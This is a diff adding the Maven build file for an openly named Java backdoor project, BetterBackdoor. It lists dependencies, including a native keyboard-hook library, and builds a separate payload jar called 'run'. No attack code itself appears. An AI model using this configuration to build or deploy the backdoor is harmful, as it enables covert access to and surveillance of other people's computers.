@@ -1,0 +1,80 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+	<modelVersion>4.0.0</modelVersion>
+	<parent>
+		<groupId>org.springframework.boot</groupId>
+		<artifactId>spring-boot-starter-parent</artifactId>
+		<version>2.1.8.RELEASE</version>
+		<relativePath />
+	</parent>
+	<groupId>com.thatcherdev</groupId>
+	<artifactId>BetterBackdoor</artifactId>
+	<version>0.0.1-SNAPSHOT</version>
+	<name>BetterBackdoor</name>
+	<description>A backdoor with a multitude of features.</description>
+
+	<properties>
+		<java.version>1.8</java.version>
+	</properties>
+
+	<dependencies>
+		<dependency>
+			<groupId>org.springframework.boot</groupId>
+			<artifactId>spring-boot-starter</artifactId>
+		</dependency>
+
+		<dependency>
+			<groupId>org.springframework.boot</groupId>
+			<artifactId>spring-boot-starter-test</artifactId>
+			<scope>test</scope>
+		</dependency>
+
+		<dependency>
+			<groupId>commons-io</groupId>
+			<artifactId>commons-io</artifactId>
+			<version>2.5</version>
+		</dependency>
+
+		<dependency>
+			<groupId>com.1stleg</groupId>
+			<artifactId>jnativehook</artifactId>
+			<version>2.0.2</version>
+		</dependency>
+	</dependencies>
+
+	<build>
+		<plugins>
+			<plugin>
+				<groupId>org.springframework.boot</groupId>
+				<artifactId>spring-boot-maven-plugin</artifactId>
+				<executions>
+					<execution>
+						<id>betterbackdoor</id>
+						<phase>package</phase>
+						<configuration>
+							<finalName>betterbackdoor</finalName>
+							<mainClass>com.thatcherdev.betterbackdoor.BetterBackdoor</mainClass>
+							<outputDirectory>${project.basedir}</outputDirectory>
+						</configuration>
+						<goals>
+							<goal>repackage</goal>
+						</goals>
+					</execution>
+
+					<execution>
+						<id>backdoor</id>
+						<phase>package</phase>
+						<configuration>
+							<finalName>run</finalName>
+							<mainClass>com.thatcherdev.betterbackdoor.backdoor.Backdoor</mainClass>
+						</configuration>
+						<goals>
+							<goal>repackage</goal>
+						</goals>
+					</execution>
+				</executions>
+			</plugin>
+		</plugins>
+	</build>
+
+</project>
